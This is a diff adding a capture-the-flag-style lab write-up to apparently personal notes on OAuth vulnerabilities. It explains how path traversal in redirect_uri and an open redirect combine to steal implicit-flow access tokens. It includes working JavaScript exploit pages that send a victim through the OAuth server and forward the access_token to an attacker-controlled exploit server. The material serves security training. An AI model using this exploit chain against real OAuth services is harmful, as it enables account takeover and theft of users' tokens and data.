@@ -143,3 +143,87 @@ https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.co
 
 It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the redirect_uri. 
 
+### Lab: Stealing OAuth access tokens via an open redirect
+Normal oauth implicit flow:
+First the endpoint is hit:
+```
+GET /auth?client_id=mql1yse6vpmkaeohozcdh&redirect_uri=https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oauth-callback&response_type=token&nonce=-130543437&scope=openid%20profile%20email HTTP/1.1
+```
+Then on oauth service page user provides their credentials and agrees to the scope (e.g. email)
+and then is redirected to the `redirect_uri` that was specified in the first request. 
+Example of a redirect from oauth:
+```
+HTTP/2 302 Found
+Location: https://ff.web-security-academy.net/oauth-callback#access_token=ImLOukbIxMWIdzBOLSzy0V9L4EKnz5bwwO98pVLprKc&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
+```
+As you can see it contains `access_token` in the url. (Which can also be accessed via `document.location.hash` BTW)
+
+That `access_token` is later used in another request to the oauth service:
+```
+GET /me HTTP/2
+Host: oauth-0acd00cc0315bc0580bc1fc6024b0017.oauth-server.net
+Authorization: Bearer ImLOukbIxMWIdzBOLSzy0V9L4EKnz5bwwO98pVLprKc
+```
+Which responses:
+```
+{
+    "sub":"wiener",
+    "apikey":"ilEYaNYP3rb21bcKuXf3dGex0wDr3vbc",
+    "name":"Peter Wiener",
+    "email":"wiener@hotdog.com",
+}
+```
+
+We want to steal `access_token` from user but we can't specify their own server in `redirect_uri`. But we see that **`redirect_uri` is vulnerable to path traversal**.
+
+Further site exploration reveals that there's an open redirect vulnerability:
+```bash
+<a href="/post/next?path=/post?postId=7">| Next post</a>
+```
+
+Specifically `?path` url query param can be changed to a url of our own external server
+
+Therefore we can change `redirect_uri`:
+```
+?redirect_uri=https://ff.web-security-academy.net/oauth-callback/../post/next?path=${attackers_server_uri}
+```
+
+And therfore the exploit can look like the following:
+```bash
+<html>
+    <script>
+        const attackers_server_uri = "https://exploit-ff.exploit-server.net/exploit"
+        const redirect_uri = `https://ff.web-security-academy.net/oauth-callback/../post/next?path=${attackers_server_uri}`
+
+        document.location = `https://oauth-ff.oauth-server.net/auth?client_id=mql1yse6vpmkaeohozcdh&redirect_uri=${redirect_uri}&response_type=token&nonce=-626744892&scope=openid%20profile%20emaill`
+    </script>
+</html>
+```
+
+Lab specific problem:
+In the lab we have to use the same `/exploit` url of the same exploit server for exploit delivery and for extraction of `access_token` from the url after the user is redirected back from the oauth service to our exploit server. That's why we need to have a bit more trickier exploit:
+```bash
+<html>
+    <script>
+        if (!document.location.hash) {
+            const attackers_server_uri = "https://exploit-0a9e0082035bbcde80c320f6018700ee.exploit-server.net/exploit"
+            const redirect_uri = `https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oauth-callback/../post/next?path=${attackers_server_uri}`
+
+            document.location = `https://oauth-0acd00cc0315bc0580bc1fc6024b0017.oauth-server.net/auth?client_id=mql1yse6vpmkaeohozcdh&redirect_uri=${redirect_uri}&response_type=token&nonce=-626744892&scope=openid%20profile%20emaill`
+        } else {
+            window.location = '/?'+document.location.hash.substr(1)
+        }
+    </script>
+</html>
+```
+
+`document.location.hash` here is used for checking if the uri contains `access_token`
+i.e. when redirecting back from oauth service, oauth service will attach `#access_token=` in the url:
+```
+HTTP/2 302 Found
+Location: https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oauth-callback#access_token=ImLOukbIxMWIdzBOLSzy0V9L4EKnz5bwwO98pVLprKc&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
+```
+
+Therefore we can check logs of our own external server and find that `access_token` there.
+
+
